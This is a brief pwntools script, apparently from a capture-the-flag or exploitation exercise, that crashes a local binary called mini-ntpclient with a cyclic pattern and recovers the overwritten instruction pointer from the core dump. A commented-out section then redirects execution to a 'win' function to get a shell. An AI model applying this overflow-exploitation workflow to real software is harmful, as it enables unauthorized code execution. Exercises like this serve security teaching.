from pwn import *
context(arch = 'i386', os = 'linux')

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(400)

# Run the process once so that it crashes
process(['./mini-ntpclient', payload]).wait()

# Get the core dump
core = Coredump('./core')

# Our cyclic pattern should have been used as the crashing address
print(type(pack(core.eip)))
print(type(payload))
assert pack(core.eip) in payload


# Cool! Now let's just replace that value with the address of 'win'
#crash = ELF('./mini-ntpclient')
#payload = fit({
#    cyclic_find(core.rip): crash.symbols.win
#})

# Get a shell!
#io = process(['./mini-ntpclient' , payload])
#io.sendline(b'id')
#print(io.recvline())
# uid=1000(user) gid=1000(user) groups=1000(user)
